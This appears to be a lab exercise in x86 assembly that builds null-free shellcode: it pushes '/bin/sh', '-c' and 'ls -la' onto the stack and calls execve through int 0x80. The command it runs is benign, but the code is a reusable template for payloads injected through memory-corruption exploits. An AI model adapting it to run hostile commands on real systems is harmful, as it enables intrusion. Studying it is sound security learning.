section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      
      ; Construct "-c"
      push eax          ; Use 0 to terminate the string
      mov  ebx, "-caa"
      shl  ebx, 16
      shr  ebx, 16
      push ebx
      mov  ecx, esp

      ; Construct "ls -la"
      push eax
      mov  ebx, "laaa"
      shl  ebx, 16
      shr  ebx, 16
      push ebx
      push "ls -"
      mov  edx, esp
      
      ; Construct "/bin/sh"
      push eax
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax
      push edx          ; argv[2] points "ls -la"
      push ecx          ; argv[1] points "-c"
      push ebx          ; argv[0] points "/bin/sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
